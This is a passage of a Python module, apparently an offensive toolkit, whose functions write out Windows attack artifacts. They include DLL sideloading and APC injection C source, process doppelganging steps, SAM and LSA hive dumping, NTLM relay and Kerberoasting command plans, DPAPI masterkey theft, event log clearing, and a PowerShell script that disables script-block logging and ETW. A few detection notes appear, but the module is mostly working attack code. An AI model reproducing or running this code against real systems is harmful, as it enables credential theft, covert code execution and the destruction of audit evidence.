        "// SSB proxy DLL for %s (artifact) -- compile: cl /LD proxy_%s.c" % (target, stem),
        "// Drop next to a victim exe that imports %s; exports forward to the real DLL." % target,
        "#include <windows.h>",
        "#include <stdio.h>",
        "",
    ]
    for i, fn in enumerate(exports):
        lines.append('#pragma comment(linker, "/export:%s=C:\\\\Windows\\\\System32\\\\%s.%s,@%d")'
                     % (fn, target, fn, i + 1))
    lines += [
        "",
        "static void payload(void) {",
        "    /* sandbox payload: beacon to a log file; replace with real logic */",
        '    FILE *f = fopen("C:\\\\Users\\\\Public\\\\ssb_sideload_hits.log", "a");',
        '    if (f) { fprintf(f, "proxy loaded pid=%lu\\n", GetCurrentProcessId()); fclose(f); }',
        "}",
        "",
        "BOOL WINAPI DllMain(HINSTANCE h, DWORD reason, LPVOID reserved) {",
        "    if (reason == DLL_PROCESS_ATTACH) {",
        "        DisableThreadLibraryCalls(h);",
        "        HANDLE t = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)payload, NULL, 0, NULL);",
        "        if (t) CloseHandle(t);",
        "    }",
        "    return TRUE;",
        "}",
        "",
    ]
    c_src = "\n".join(lines)
    path = os.path.join(_ART, "proxy_%s.c" % stem)
    err = _write_artifact(path, c_src)
    if err:
        return _res(power, False, error=err)
    return _res(power, True, artifact=path, source=c_src, target_dll=target,
                export_count=len(exports), target_os="windows",
                compile_cmd="cl.exe /LD /Fe:%s proxy_%s.c" % (target, stem),
                technique="search-order sideload: proxy resolves ordinals to the real system DLL via linker export forwarding",
                armed=_armed(args), note=_win_note())


def p_apc_inject_gen(args):
    """GEN: real C source artifact for APC-queues injection (OpenProcess/VirtualAllocEx/WriteProcessMemory/QueueUserAPC)."""
    power = _name("apc_inject_gen")
    c_src = r"""// SSB APC injection (artifact) -- compile: cl apc_inject.c
// QueueUserAPC into every alertable thread of the target process.
#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>

static unsigned char sc[] =
    "\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51"  /* placeholder shellcode: */
    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\xc3";     /* NOP sled + ret (harmless) */

int main(int argc, char **argv) {
    if (argc < 2) { printf("usage: apc_inject <pid>\n"); return 1; }
    DWORD pid = (DWORD)atoi(argv[1]);
    HANDLE hp = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (!hp) { printf("OpenProcess failed %lu\n", GetLastError()); return 1; }
    LPVOID mem = VirtualAllocEx(hp, NULL, sizeof(sc), MEM_COMMIT | MEM_RESERVE,
                                PAGE_EXECUTE_READWRITE);
    if (!mem) { printf("VirtualAllocEx failed %lu\n", GetLastError()); return 1; }
    if (!WriteProcessMemory(hp, mem, sc, sizeof(sc), NULL)) {
        printf("WriteProcessMemory failed %lu\n", GetLastError()); return 1; }
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    THREADENTRY32 te = { sizeof(te) };
    int queued = 0;
    for (BOOL ok = Thread32First(snap, &te); ok; ok = Thread32Next(snap, &te)) {
        if (te.th32OwnerProcessID != pid) continue;
        HANDLE ht = OpenThread(THREAD_SET_CONTEXT | THREAD_SUSPEND_RESUME, FALSE, te.th32ThreadID);
        if (!ht) continue;
        if (QueueUserAPC((PAPCFUNC)mem, ht, 0)) queued++;  /* fires when thread goes alertable */
        CloseHandle(ht);
    }
    CloseHandle(snap);
    printf("[+] APC queued on %d threads of pid %lu\n", queued, pid);
    return 0;
}
"""
    path = os.path.join(_ART, "apc_inject.c")
    err = _write_artifact(path, c_src)
    if err:
        return _res(power, False, error=err)
    return _res(power, True, artifact=path, source=c_src, target_os="windows",
                compile_cmd="cl.exe apc_inject.c",
                technique="QueueUserAPC executes when target thread enters alertable wait (SleepEx/WaitForSingleObjectEx)",
                armed=_armed(args), note=_win_note())


def p_process_doppel_gen(args):
    """GEN: process doppelganging artifact (TxF + NtCreateSection/RollbackTransaction C# outline + notes) into /tmp."""
    power = _name("process_doppel_gen")
    cs = r"""// SSB process doppelganging outline (artifact) -- requires undocumented NT APIs
// Technique (Tal Liberman, BSides 2017): transact a file write, create a section
// from the transacted file, spawn process from the section, roll back the
// transaction so the payload never touches disk.
using System;
using System.Runtime.InteropServices;

public class Doppel {
    // 1. CreateTransaction + CreateFileTransacted: open legit exe inside a TxF tx
    // 2. WriteFile payload bytes into the transacted file (disk untouched)
    // 3. NtCreateSection(SEC_IMAGE) on the transacted handle
    // 4. NtCreateProcessEx from the section handle -> process backed by our bytes
    // 5. RollbackTransaction -> on-disk file reverts, payload never scanned on disk
    // 6. NtCreateThreadEx + process params (RtlCreateProcessParametersEx) to start
    [DllImport("ntdll.dll")]
    static extern int NtCreateSection(out IntPtr section, uint access, IntPtr attr,
        ref long size, uint protect, uint alloc, IntPtr file);
    [DllImport("ktmw32.dll", SetLastError=true)]
    static extern IntPtr CreateTransaction(IntPtr attr, IntPtr guid, int opts, int iso,
        int isoFlags, int timeout, string desc);
    [DllImport("ktmw32.dll", SetLastError=true)]
    static extern bool RollbackTransaction(IntPtr tx);
    // Full implementation left as source review; see notes.
}
"""
    notes = os.path.join(_ART, "process_doppel_notes.txt")
    notes_txt = (
        "Process doppelganging key points:\n"
        " - Needs TxF (deprecated after Win10 1803; still works on many builds)\n"
        " - Defender added TxF section scanning (MpCallPreControl) post-2018\n"
        " - Steps: CreateTransaction -> CreateFileTransacted -> overwrite ->\n"
        "   NtCreateSection(SEC_IMAGE) -> NtCreateProcessEx -> RollbackTransaction\n"
        " - Detect: ETW Microsoft-Windows-Kernel-TransactionManager + image loads\n"
        "   whose backing file no longer exists on disk.\n")
    e1 = _write_artifact(os.path.join(_ART, "process_doppel.cs"), cs)
    e2 = _write_artifact(notes, notes_txt)
    if e1 or e2:
        return _res(power, False, error=e1 or e2)
    return _res(power, True,
                artifacts={"cs": os.path.join(_ART, "process_doppel.cs"), "notes": notes},
                source=cs, target_os="windows", armed=_armed(args),
                caveat="TxF deprecated; modern Defender scans transacted sections",
                note=_win_note())


# ---------------------------------------------------------------------------
# Credential-access artifact generators (armed=false default)
# ---------------------------------------------------------------------------

def p_sam_dump_gen(args):
    """GEN: SAM/SYSTEM hive dump artifact (reg save + volume-shadow variants) + offline parse notes; arm=true would run on Windows."""
    power = _name("sam_dump_gen")
    outdir = args.get("out", r"C:\Users\Public")
    cmd = (":: SSB SAM hive dump (artifact) -- requires SYSTEM/admin\n"
           "reg save HKLM\\SAM %s\\sam.hive\n"
           "reg save HKLM\\SYSTEM %s\\system.hive\n"
           "reg save HKLM\\SECURITY %s\\security.hive\n" % (outdir, outdir, outdir))
    ps1 = ("# SSB shadow-copy SAM theft (artifact) -- requires admin\n"
           "$s = (Get-WmiObject -List Win32_ShadowCopy).Create('C:\\','ClientAccessible')\n"
           "$sc = Get-WmiObject Win32_ShadowCopy | Select-Object -Last 1\n"
           "Copy-Item ($sc.DeviceObject + '\\Windows\\System32\\config\\SAM') '%s\\sam.hive'\n"
           "Copy-Item ($sc.DeviceObject + '\\Windows\\System32\\config\\SYSTEM') '%s\\system.hive'\n"
           "$sc.Delete()\n" % (outdir, outdir))
    notes = os.path.join(_ART, "sam_parse_notes.txt")
    e1 = _write_artifact(os.path.join(_ART, "sam_dump.cmd"), cmd)
    e2 = _write_artifact(os.path.join(_ART, "sam_shadow_copy.ps1"), ps1)
    e3 = _write_artifact(notes,
        "Offline parse: impacket-secretsdump LOCAL -sam sam.hive -system system.hive\n"
        "Bootkey from SYSTEM hive decrypts SAM hash cells; NTLM hashes are RC4(syskey)\n"
        "encrypted DES(rid) hashes of MD4(utf16le(password)).\n")
    if e1 or e2 or e3:
        return _res(power, False, error=e1 or e2 or e3)
    return _res(power, True,
                artifacts={"cmd": os.path.join(_ART, "sam_dump.cmd"),
                           "shadow_ps1": os.path.join(_ART, "sam_shadow_copy.ps1"),
                           "notes": notes},
                target_os="windows", requires="SYSTEM (reg save HKLM\\SAM) or admin+shadowcopy",
                armed=_armed(args), note=_win_note())


def p_ntlm_relay_gen(args):
    """GEN: NTLM relay engagement plan artifact (coerce->relay->escalate matrix + responder/ntlmrelayx commands) into /tmp."""
    power = _name("ntlm_relay_gen")
    plan = {
        "stage1_capture": [
            "responder -I eth0 -wrf  # poison LLMNR/NBT-NS, capture NetNTLMv2",
            "mitm6 -d corp.local  # DHCPv6 spoof -> WPAD -> HTTP auth capture",
        ],
        "stage2_coerce": [
            "PetitPotam: EfsRpcOpenFileRaw -> force DC$ machine auth to listener",
            "PrinterBug: RpcRemoteFindFirstPrinterChangeNotification(Ex)",
            "DFSCoerce: NetrDfsRemoveStdRoot on DFS servers",
        ],
        "stage3_relay": [
            "ntlmrelayx.py -t ldap://dc.corp.local --escalate-user lowpriv  # RBCD/shadow creds",
            "ntlmrelayx.py -t smb://target --no-smb2-require -c 'whoami'  # if signing off",
            "ntlmrelayx.py -t ldaps://dc --add-computer  # machine account for RBCD",
        ],
        "stage4_mitigations_check": [
            "SMB signing required? Get-SmbServerConfiguration | fl RequireSecuritySignature",
            "LDAP signing / channel binding (EPA) enforced on DC?",
            "Extended Protection for Auth on Exchange/IIS?",
        ],
    }
    txt = "SSB NTLM RELAY PLAN (artifact)\n" + "=" * 40 + "\n"
    for stage, steps in plan.items():
        txt += "\n[%s]\n" % stage + "\n".join("  - %s" % s for s in steps) + "\n"
    path = os.path.join(_ART, "ntlm_relay_plan.txt")
    err = _write_artifact(path, txt)
    if err:
        return _res(power, False, error=err)
    return _res(power, True, artifact=path, plan=plan, target_os="windows-domain",
                armed=_armed(args),
                note="plan artifact only; relaying requires network position on a Windows domain")


def p_kerberoast_gen(args):
    """GEN: Kerberoast engagement artifact (SPN discovery PS + Rubeus-style request plan + hash format notes) into /tmp."""
    power = _name("kerberoast_gen")
    ps1 = r"""# SSB kerberoast SPN discovery (artifact) -- any domain user can run this
$searcher = New-Object DirectoryServices.DirectorySearcher
$searcher.Filter = '(&(objectCategory=person)(servicePrincipalName=*))'
$searcher.PropertiesToLoad.AddRange(@('sAMAccountName','servicePrincipalName','memberOf','pwdLastSet'))
$searcher.FindAll() | ForEach-Object {
  [pscustomobject]@{ User=$_.Properties['samaccountname'][0];
    SPNs=($_.Properties['serviceprincipalname'] -join ';');
    Groups=($_.Properties['memberof'] -join ';') }
} | Format-List
"""
    plan = [
        "Rubeus.exe kerberoast /outfile:hashes.txt  # request RC4 TGS for all SPN users",
        "Rubeus.exe kerberoast /user:svc-sql /rc4opsec  # targeted, RC4 only",
        "GetUserSPNs.py corp.local/user:pass -request -dc-ip 10.0.0.1  # from Linux",
        "hashcat -m 13100 hashes.txt wordlist.txt  # crack RC4-HMAC TGS-REP ($krb5tgs$23$)",
        "Prefer RC4 (etype 23) tickets: downgrade via /rc4opsec or etype 23 request",
        "OPSEC: TGS requests are normal traffic; alert on unusual volume (4769 events)",
    ]
    e1 = _write_artifact(os.path.join(_ART, "kerberoast_discover.ps1"), ps1)
    e2 = _write_artifact(os.path.join(_ART, "kerberoast_plan.txt"),
                         "SSB KERBEROAST PLAN\n" + "=" * 40 + "\n" +
                         "\n".join("%d. %s" % (i + 1, s) for i, s in enumerate(plan)) + "\n")
    if e1 or e2:
        return _res(power, False, error=e1 or e2)
    return _res(power, True,
                artifacts={"discover_ps1": os.path.join(_ART, "kerberoast_discover.ps1"),
                           "plan": os.path.join(_ART, "kerberoast_plan.txt")},
                script=ps1, plan=plan, target_os="windows-domain",
                requires="any authenticated domain user", armed=_armed(args),
                note=_win_note())


def p_lsa_secret_gen(args):
    """GEN: LSA secrets extraction artifact (HKLM\\SECURITY hive save + secretsdump parse notes) into /tmp."""
    power = _name("lsa_secret_gen")
    outdir = args.get("out", r"C:\Users\Public")
    cmd = (":: SSB LSA secrets dump (artifact) -- requires SYSTEM\n"
           "reg save HKLM\\SECURITY %s\\security.hive\n"
           "reg save HKLM\\SYSTEM %s\\system.hive\n"
           ":: offline: impacket-secretsdump LOCAL -security security.hive -system system.hive\n"
           % (outdir, outdir))
    notes = ("LSA secrets live under HKLM\\SECURITY\\Policy\\Secrets\\* encrypted with the "
             "LSA key, itself encrypted with the bootkey from SYSTEM. Contains: "
             "$MACHINE.ACC (computer account hash -> silver tickets / RBCD), "
             "DefaultPassword (autologon), _SC_<service> (service account passwords), "
             "DPAPI_SYSTEM (machine DPAPI masterkey protector), NL$KM (cached cred keys).")
    e1 = _write_artifact(os.path.join(_ART, "lsa_secret_dump.cmd"), cmd)
    e2 = _write_artifact(os.path.join(_ART, "lsa_secret_notes.txt"), notes + "\n")
    if e1 or e2:
        return _res(power, False, error=e1 or e2)
    return _res(power, True,
                artifacts={"cmd": os.path.join(_ART, "lsa_secret_dump.cmd"),
                           "notes": os.path.join(_ART, "lsa_secret_notes.txt")},
                notes=notes, target_os="windows", requires="SYSTEM",
                armed=_armed(args), note=_win_note())


def p_dpapi_masterkey_gen(args):
    """GEN: DPAPI masterkey extraction artifact (user SID discovery + domain-backup-key decrypt plan) into /tmp."""
    power = _name("dpapi_masterkey_gen")
    ps1 = r"""# SSB DPAPI inventory (artifact) -- read-only listing of masterkey + credential blobs
$report = [ordered]@{}
$report.Users = Get-ChildItem 'C:\Users' -Directory -ErrorAction SilentlyContinue | ForEach-Object {
  $mk = "$($_.FullName)\AppData\Roaming\Microsoft\Protect"
  $creds = "$($_.FullName)\AppData\Roaming\Microsoft\Credentials"
  [pscustomobject]@{ User=$_.Name;
    MasterKeyDirs=(Test-Path $mk) ? (Get-ChildItem $mk -Recurse -Filter '*' -ErrorAction SilentlyContinue | Select-Object -Expand FullName) : @();
    CredBlobs=(Test-Path $creds) ? (Get-ChildItem $creds -ErrorAction SilentlyContinue | Select-Object -Expand FullName) : @() }
}
$report.MachineSystem = Get-ChildItem 'C:\Windows\System32\Microsoft\Protect\S-1-5-18' -ErrorAction SilentlyContinue |
  Select-Object -Expand FullName
$report | ConvertTo-Json -Depth 4
"""
    plan = [
        "1. Inventory masterkeys: %APPDATA%\\Microsoft\\Protect\\<SID>\\<GUID>",
        "2. Decrypt with user password+SID (mimikatz dpapi::masterkey /in:<guid> /password:...)",
        "3. Domain path: steal DPAPI backup key from DC (lsadump::backupkeys) -> decrypt ANY user's masterkey",
        "4. Machine secrets: DPAPI_SYSTEM from LSA secrets decrypts SYSTEM masterkeys",
        "5. Then dpapi::cred / dpapi::chrome / dpapi::vault to decode the blobs",
    ]
    e1 = _write_artifact(os.path.join(_ART, "dpapi_inventory.ps1"), ps1)
    e2 = _write_artifact(os.path.join(_ART, "dpapi_plan.txt"),
                         "SSB DPAPI PLAN\n" + "=" * 40 + "\n" + "\n".join(plan) + "\n")
    if e1 or e2:
        return _res(power, False, error=e1 or e2)
    return _res(power, True,
                artifacts={"inventory_ps1": os.path.join(_ART, "dpapi_inventory.ps1"),
                           "plan": os.path.join(_ART, "dpapi_plan.txt")},
                script=ps1, plan=plan, target_os="windows", armed=_armed(args),
                note=_win_note())


# ---------------------------------------------------------------------------
# Logging / tamper artifact generators
# ---------------------------------------------------------------------------

def p_eventlog_clear_gen(args):
    """GEN: eventlog tamper artifact (wevtutil clear + selective-record-deletion notes) into /tmp."""
    power = _name("eventlog_clear_gen")
    ps1 = r"""# SSB eventlog tamper (artifact) -- requires admin; LOUD
# Full clear (generates its own event: Security 1102 / System 104):
wevtutil cl Security
wevtutil cl System
wevtutil cl Application
wevtutil cl "Microsoft-Windows-PowerShell/Operational"
# Stealthier: suspend the service threads instead of clearing
# (EventLog service PID from: Get-Process svchost | ? {$_.Modules -match 'wevtsvc'})
# then Suspend-Thread -> logs queue silently; Resume-Thread to restore.
"""
    notes = os.path.join(_ART, "eventlog_notes.txt")
    e1 = _write_artifact(os.path.join(_ART, "eventlog_clear.ps1"), ps1)
    e2 = _write_artifact(notes,
        "Selective deletion (no 1102): phant0m-style thread-kill of the eventlog\n"
        "service, or DanderSpritz EventLogEdit / EllipticCurve-CVE-2020-0609 era tools.\n"
        "wevtutil cl leaves Security 1102 'audit log cleared' -- detection anchor.\n"
        "Silence channel instead: wevtutil sl <channel> /e:false (writes System 105).\n")
    if e1 or e2:
        return _res(power, False, error=e1 or e2)
    return _res(power, True,
                artifacts={"ps1": os.path.join(_ART, "eventlog_clear.ps1"), "notes": notes},
                script=ps1, target_os="windows", requires="admin",
                detection="clearing Security log emits event 1102; suspension approach avoids it",
                armed=_armed(args), note=_win_note())


def p_ps_logging_bypass_gen(args):
    """GEN: PowerShell logging-bypass artifact (ScriptBlockLogging/ModuleLogging GPO keys + in-memory PSEtwLogProvider patch) into /tmp."""
    power = _name("ps_logging_bypass_gen")
    reg = ("Windows Registry Editor Version 5.00\r\n\r\n"
           "[HKEY_CURRENT_USER\\Software\\Policies\\Microsoft\\Windows\\PowerShell\\ScriptBlockLogging]\r\n"
           "\"EnableScriptBlockLogging\"=dword:00000000\r\n\r\n"
           "[HKEY_CURRENT_USER\\Software\\Policies\\Microsoft\\Windows\\PowerShell\\ModuleLogging]\r\n"
           "\"EnableModuleLogging\"=dword:00000000\r\n")
    ps1 = r"""# SSB PS logging bypass (artifact) -- in-memory, this process only
# 1) GPO cache poisoning: PSH reads logging policy once per session from a cached
#    dictionary -- flip EnableScriptBlockLogging/InvocationHeader in it
$gpo = [Ref].Assembly.GetType('System.Management.Automation.Utils')
$cache = $gpo.GetField('cachedGroupPolicySettings','NonPublic,Static').GetValue($null)
if ($cache['ScriptBlockLogging']) {
  $cache['ScriptBlockLogging']['EnableScriptBlockLogging'] = 0
  $cache['ScriptBlockLogging']['EnableScriptBlockInvocationLogging'] = 0
}
# 2) ETW: patch the PSEtwLogProvider field so WriteEvent becomes a no-op
$lp = [Ref].Assembly.GetType('System.Management.Automation.Tracing.PSEtwLogProvider')
$lp.GetField('etwProvider','NonPublic,Static').SetValue($null, $null)
Write-Host "[+] scriptblock logging + PSEtwLogProvider neutralized (this process)"
"""
    e1 = _write_artifact(os.path.join(_ART, "ps_logging_bypass.reg"), reg)
    e2 = _write_artifact(os.path.join(_ART, "ps_logging_bypass.ps1"), ps1)
    if e1 or e2:
        return _res(power, False, error=e1 or e2)
    return _res(power, True,
                artifacts={"reg": os.path.join(_ART, "ps_logging_bypass.reg"),
                           "ps1": os.path.join(_ART, "ps_logging_bypass.ps1")},
                script=ps1, reg_text=reg, target_os="windows",
                scope="reg=HKCU GPO cache (per-user); ps1=in-memory per-process",
                armed=_armed(args), note=_win_note())


# ---------------------------------------------------------------------------
# REAL cross-platform named-pipe analog + Windows artifact
# ---------------------------------------------------------------------------

_PIPE_DEMO_SOCK = os.path.join(_TMP, "ssb_winpipe_demo.sock")


def p_named_pipe_server_gen(args):
    """REAL: run a live AF_UNIX server/client round-trip here (analog of Windows named pipes) AND emit a C# NamedPipeServer artifact; arm=true runs the demo."""
    power = _name("named_pipe_server_gen")
    pipe_name = args.get("pipe", "ssb_pipe")
    cs = r"""// SSB named pipe server (artifact) -- compile: csc.exe pipe_server.cs
using System;
using System.IO;
using System.IO.Pipes;
using System.Text;

public class PipeServer {
    public static void Main(string[] args) {
        string name = args.Length > 0 ? args[0] : "%PIPE%";
        using (var srv = new NamedPipeServerStream(name, PipeDirection.InOut,
                   1, PipeTransmissionMode.Message, PipeOptions.Asynchronous)) {
            Console.WriteLine("[*] listening on \\\\.\\pipe\\" + name);
            srv.WaitForConnection();
            byte[] buf = new byte[4096];
            int n = srv.Read(buf, 0, buf.Length);
            string msg = Encoding.UTF8.GetString(buf, 0, n);
            Console.WriteLine("[<] " + msg);
            byte[] reply = Encoding.UTF8.GetBytes("ack:" + msg.ToUpper());
            srv.Write(reply, 0, reply.Length);
        }
    }
}
""".replace("%PIPE%", pipe_name)
    art = os.path.join(_ART, "pipe_server.cs")
    err = _write_artifact(art, cs)
    if err:
        return _res(power, False, error=err)
    out = {"artifact": art, "source": cs, "windows_pipe": r"\\.\pipe\%s" % pipe_name,
           "target_os": "windows", "armed": _armed(args), "note": _win_note()}
    if not _armed(args):
        out["would_do"] = ("run live AF_UNIX round-trip at %s on THIS host as a "
                           "named-pipe analog" % _PIPE_DEMO_SOCK)
        return _res(power, True, **out)
    # REAL demo: unix domain socket server + client round-trip, works here.
    try:
        os.unlink(_PIPE_DEMO_SOCK)
    except OSError:
        pass
    result = {}
    srv = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
    srv.bind(_PIPE_DEMO_SOCK)
    srv.listen(1)

    def _server():
        conn, _ = srv.accept()
        data = conn.recv(4096).decode()
        result["server_received"] = data
        conn.sendall(("ack:" + data.upper()).encode())
        conn.close()

    t = threading.Thread(target=_server, daemon=True)
    t.start()
    cli = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
    cli.connect(_PIPE_DEMO_SOCK)
    msg = args.get("message", "ping from ssb")
    cli.sendall(msg.encode())
    reply = cli.recv(4096).decode()
    cli.close()
    t.join(timeout=5)
    srv.close()
    os.unlink(_PIPE_DEMO_SOCK)
    out.update(action="live_roundtrip_done", analog_socket=_PIPE_DEMO_SOCK,
               client_sent=msg, server_received=result.get("server_received"),
               client_got=reply,
               mapping="AF_UNIX SOCK_STREAM == Windows NamedPipeServerStream (message mode)")
    return _res(power, True, **out)


POWERS = {
    _name("pe_parser"): p_pe_parser,
    _name("reg_hive_audit_gen"): p_reg_hive_audit_gen,
    _name("autoruns_full_gen"): p_autoruns_full_gen,
    _name("wmi_query_gen"): p_wmi_query_gen,
    _name("cert_store_audit_gen"): p_cert_store_audit_gen,
    _name("com_hijack_gen"): p_com_hijack_gen,
    _name("uac_bypass_gen"): p_uac_bypass_gen,
    _name("token_impersonation_gen"): p_token_impersonation_gen,
    _name("amsi_patch_gen"): p_amsi_patch_gen,
    _name("etw_disable_gen"): p_etw_disable_gen,
    _name("defender_exclusion_gen"): p_defender_exclusion_gen,
    _name("bits_persist_gen"): p_bits_persist_gen,
    _name("schtasks_persist_gen"): p_schtasks_persist_gen,
    _name("dll_sideload_gen"): p_dll_sideload_gen,
    _name("apc_inject_gen"): p_apc_inject_gen,
    _name("process_doppel_gen"): p_process_doppel_gen,
    _name("sam_dump_gen"): p_sam_dump_gen,
    _name("ntlm_relay_gen"): p_ntlm_relay_gen,
    _name("kerberoast_gen"): p_kerberoast_gen,
    _name("lsa_secret_gen"): p_lsa_secret_gen,
    _name("dpapi_masterkey_gen"): p_dpapi_masterkey_gen,
    _name("eventlog_clear_gen"): p_eventlog_clear_gen,
    _name("ps_logging_bypass_gen"): p_ps_logging_bypass_gen,
    _name("named_pipe_server_gen"): p_named_pipe_server_gen,
}

if __name__ == "__main__":
    print(json.dumps(POWERS["nm20.win.named_pipe_server_gen"]({"arm": True}), indent=2)[:4000])
